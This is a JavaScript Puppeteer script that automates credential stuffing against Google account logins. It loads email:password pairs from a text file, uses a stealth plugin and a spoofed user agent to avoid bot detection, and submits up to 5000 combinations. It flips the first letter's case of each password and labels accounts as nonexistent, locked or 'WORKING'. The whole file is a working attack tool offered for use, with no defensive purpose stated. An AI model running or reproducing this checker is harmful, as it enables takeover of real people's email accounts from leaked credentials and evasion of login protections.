const { Keyboard } = require('puppeteer');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const values = ['Wrong',"changed","find","Step","email","Check","valid", "locked", "Type"];

puppeteer.use(StealthPlugin());


var JFile = require('jfile');

var myF = new JFile("./data.txt");

function capitalizeWords(arr) {
   return arr.map(element => {
     return element.charAt(0).toUpperCase() + element.substring(1);
   });
 }


 function decapitalizeWords(arr) {
   return arr.map(element => {
     return element.charAt(0).toLowerCase() + element.substring(1);
   });
 }


 function checkUpper(string){

   return /^\p{Lu}/u.test( string );
   

 }

(async () => {
   const browser = await puppeteer.launch({
      headless: false,
      args: [
         '--no-sandbox',
         '--disable-gpu',
         '--enable-webgl',
         '--window-size=800,800'
      ]
   });



      const loginUrl = "https://accounts.google.com/AccountChooser?service=mail&continue=https://google.com&hl=en";
      const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36';
      const page = await browser.newPage();
      await page.setUserAgent(ua);
      await page.goto(loginUrl, { waitUntil: 'networkidle2' });


      for (let i = 0; i < 5000; i++) {

      await page.type('input[type="email"]', myF.lines[i].split(":")[0]);
      await page.keyboard.press('Enter');
      await page.waitForTimeout(5000);


      const error = await page.evaluate((strings) => {
         const text = document.body.innerText;
         return strings.filter(string => text.includes(string));
       }, values);


       if(error.includes("find") || error.includes("valid")){
         console.log(1+i + ': [ `Not Exist` ] : ' +  myF.lines[i].split(":")[0] + ":" + (checkUpper([myF.lines[i].split(":")[1]]) ? decapitalizeWords([myF.lines[i].split(":")[1]]) : capitalizeWords([myF.lines[i].split(":")[1]])));
         await page.goto(loginUrl, { waitUntil: 'networkidle2' });
         continue;
       }else if(error.includes("locked") || error.includes("Type")){

        console.log(1+i + ': [ `Locked` ] : ' +  myF.lines[i].split(":")[0] + ":" + (checkUpper([myF.lines[i].split(":")[1]]) ? decapitalizeWords([myF.lines[i].split(":")[1]]) : capitalizeWords([myF.lines[i].split(":")[1]])));
         await page.goto(loginUrl, { waitUntil: 'networkidle2' });
         continue;

       }


      await page.type('input[name="password"]', (checkUpper([myF.lines[i].split(":")[1]]) ? decapitalizeWords([myF.lines[i].split(":")[1]]) : capitalizeWords([myF.lines[i].split(":")[1]])));
      await page.keyboard.press('Enter');
      await page.waitForTimeout(3000);


      const matches = await page.evaluate((strings) => {
         const text = document.body.innerText;
         return strings.filter(string => text.includes(string));
       }, values);
   
       console.log( (1+i) + ": " + (matches.length != 0 ? matches : "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~WORKING~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~") + ": " + myF.lines[i].split(":")[0] + ":" + (checkUpper([myF.lines[i].split(":")[1]]) ? decapitalizeWords([myF.lines[i].split(":")[1]]) : capitalizeWords([myF.lines[i].split(":")[1]])));

       await page.goto(loginUrl, { waitUntil: 'networkidle2' });
      

      }
   
})();


